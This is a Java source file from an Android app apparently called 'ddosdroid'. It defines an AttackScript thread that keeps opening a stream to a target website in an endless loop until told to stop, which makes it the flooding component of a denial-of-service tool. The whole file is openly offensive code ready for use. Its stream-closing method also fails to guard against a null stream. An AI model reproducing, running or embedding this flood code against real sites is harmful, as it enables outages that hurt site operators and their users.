package gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.attack.service;

import android.util.Log;

import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;

public class AttackScript extends Thread {
    private static final String TAG = "AttackScript";
    private URL url;
    private boolean stopped = false;

    public AttackScript(String website) {
        initializeUrl(website);
    }

    private void initializeUrl(String website) {
        try {
            url = new URL(website);
        } catch (MalformedURLException e) {
            Log.e(TAG, "Wrong url?", e);
        }
    }

    @Override
    public void run() {
        while (!stopped) {
            readUrl();
        }
    }

    private void readUrl() {
        InputStream in = null;
        try {
            in = url.openStream();
        } catch (IOException e) {
            Log.e(TAG, "openStream() error.", e);
        } finally {
            closeInputStream(in);
        }
    }

    private void closeInputStream(InputStream in) {
        try {
            in.close();
        } catch (IOException e) {
            Log.e(TAG, "Error while closing the input stream.", e);
        }
    }

    public void stopExecution() {
        stopped = true;
    }

    public boolean isStopped() {
        return stopped;
    }
}
